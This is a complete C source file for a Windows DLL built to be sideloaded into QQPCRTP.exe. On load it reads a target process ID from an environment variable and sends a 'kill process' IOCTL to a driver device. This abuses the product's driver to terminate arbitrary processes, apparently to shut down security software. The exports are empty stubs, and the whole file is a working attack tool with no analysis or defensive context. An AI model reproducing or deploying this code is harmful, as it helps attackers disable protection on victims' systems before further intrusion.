#include <windows.h>

// IOCTL code for kill process
#define IOCTL_KILL 0x002224C8
// Device symlink
#define DEVICE_PATH L"\\\\.\\ODAY_{3EEEDE5F-C832-4126-AA30-0DC8A81FA22E}"
// Environment variable: set KILL_PID=1234 before launching QQPCRTP.exe

static void do_kill(void) {
    char buf[32] = {0};
    if (!GetEnvironmentVariableA("KILL_PID", buf, sizeof(buf))) return;

    DWORD pid = (DWORD)atoi(buf);
    if (pid == 0 || pid == 4) return;

    // Open driver device
    HANDLE hDev = CreateFileW(DEVICE_PATH, GENERIC_READ | GENERIC_WRITE,
                              0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDev == INVALID_HANDLE_VALUE) return;

    // IOCTL buffer: [pid:u64, param2:u64, param3:u32, result:u32] = 24 bytes
    BYTE ioctl_buf[24] = {0};
    *(ULONGLONG*)&ioctl_buf[0] = (ULONGLONG)pid;

    DWORD returned = 0;
    DeviceIoControl(hDev, IOCTL_KILL, ioctl_buf, 24, ioctl_buf, 24,
                    &returned, NULL);
    CloseHandle(hDev);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        do_kill();
    }
    return TRUE;
}

// All exported functions are empty stubs - DllMain already did the work
